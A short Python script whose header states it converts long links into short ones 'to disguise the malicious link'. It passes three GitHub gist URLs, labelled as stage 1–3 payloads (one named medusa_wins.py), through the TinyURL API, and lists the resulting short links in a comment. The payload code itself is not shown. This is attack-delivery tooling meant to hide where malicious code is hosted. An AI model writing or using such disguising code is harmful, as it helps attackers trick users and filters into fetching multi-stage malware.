'''
 # @ Create Time: 2025-05-09 10:10:00
 # @ Modified time: 2025-05-09 10:10:06
 # @ Description: convert long link into a short link to disguise the malicious link
 '''

import requests


stage1_payload = "https://gist.githubusercontent.com/Wapiti08/519771e3a0323b43944f20cf3fa4f0c1/raw/3178258015328925aa484719964849760102cf53/stage1.py"

stage2_payload = "https://gist.githubusercontent.com/Wapiti08/2f36f25fe4e639dc354a8bfd6829fa66/raw/a8c4221ef705ab49a8e87c7abe59dd3b35f1305d/stage2.py"

stage3_payload = "https://gist.githubusercontent.com/Wapiti08/191023b9a2e8dfe47339b8856c18c29e/raw/94555205262ecba7ee90edf9d83356452a0c3a0e/medusa_wins.py"

api_url = "http://tinyurl.com/api-create.php"

for long_url in [stage2_payload, stage1_payload, stage3_payload]:
    response = requests.get(api_url, params={"url": long_url})
    if response.status_code == 200:
        short_url = response.text
        print(f"Shortened URL of {long_url} is:", short_url)

    else:
        print("Failed to shorten the URL. Status code:", response.status_code)


'''
# stage1: https://tinyurl.com/2dzjy6hd
# stage2: https://tinyurl.com/28n6vhp9
# stage3: https://tinyurl.com/2acl9edo
'''
